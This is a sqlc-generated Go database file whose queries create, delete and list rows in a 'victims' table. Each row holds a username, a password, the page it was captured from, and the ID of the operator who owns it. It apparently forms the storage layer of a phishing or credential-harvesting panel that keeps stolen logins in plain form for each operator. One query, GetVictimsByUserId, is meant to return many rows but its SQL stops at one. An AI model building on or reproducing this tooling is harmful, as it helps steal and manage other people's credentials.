// Code generated by sqlc. DO NOT EDIT.
// versions:
//   sqlc v1.26.0
// source: victims.sql

package database

import (
	"context"

	"github.com/google/uuid"
)

const createVictim = `-- name: CreateVictim :one
INSERT INTO victims (
        username,
        password,
        page,
        user_id
    )
VALUES (
        $1,
        $2,
        $3,
        $4
    )
RETURNING id, created_at, username, password, page, user_id
`

type CreateVictimParams struct {
	Username string
	Password string
	Page     string
	UserID   int32
}

func (q *Queries) CreateVictim(ctx context.Context, arg CreateVictimParams) (Victim, error) {
	row := q.db.QueryRowContext(ctx, createVictim,
		arg.Username,
		arg.Password,
		arg.Page,
		arg.UserID,
	)
	var i Victim
	err := row.Scan(
		&i.ID,
		&i.CreatedAt,
		&i.Username,
		&i.Password,
		&i.Page,
		&i.UserID,
	)
	return i, err
}

const deleteVictim = `-- name: DeleteVictim :one
DELETE FROM victims
WHERE id = $1
RETURNING id, created_at, username, password, page, user_id
`

func (q *Queries) DeleteVictim(ctx context.Context, id uuid.UUID) (Victim, error) {
	row := q.db.QueryRowContext(ctx, deleteVictim, id)
	var i Victim
	err := row.Scan(
		&i.ID,
		&i.CreatedAt,
		&i.Username,
		&i.Password,
		&i.Page,
		&i.UserID,
	)
	return i, err
}

const getAllVictims = `-- name: GetAllVictims :one
SELECT COALESCE(JSON_AGG(victims), '[]') victims
FROM victims
`

func (q *Queries) GetAllVictims(ctx context.Context) (interface{}, error) {
	row := q.db.QueryRowContext(ctx, getAllVictims)
	var victims interface{}
	err := row.Scan(&victims)
	return victims, err
}

const getVictimById = `-- name: GetVictimById :one
SELECT id, created_at, username, password, page, user_id
FROM victims
WHERE id = $1
LIMIT 1
`

func (q *Queries) GetVictimById(ctx context.Context, id uuid.UUID) (Victim, error) {
	row := q.db.QueryRowContext(ctx, getVictimById, id)
	var i Victim
	err := row.Scan(
		&i.ID,
		&i.CreatedAt,
		&i.Username,
		&i.Password,
		&i.Page,
		&i.UserID,
	)
	return i, err
}

const getVictimsByUserId = `-- name: GetVictimsByUserId :many
SELECT id, created_at, username, password, page, user_id
FROM victims
WHERE user_id = $1
LIMIT 1
`

func (q *Queries) GetVictimsByUserId(ctx context.Context, userID int32) ([]Victim, error) {
	rows, err := q.db.QueryContext(ctx, getVictimsByUserId, userID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var items []Victim
	for rows.Next() {
		var i Victim
		if err := rows.Scan(
			&i.ID,
			&i.CreatedAt,
			&i.Username,
			&i.Password,
			&i.Page,
			&i.UserID,
		); err != nil {
			return nil, err
		}
		items = append(items, i)
	}
	if err := rows.Close(); err != nil {
		return nil, err
	}
	if err := rows.Err(); err != nil {
		return nil, err
	}
	return items, nil
}
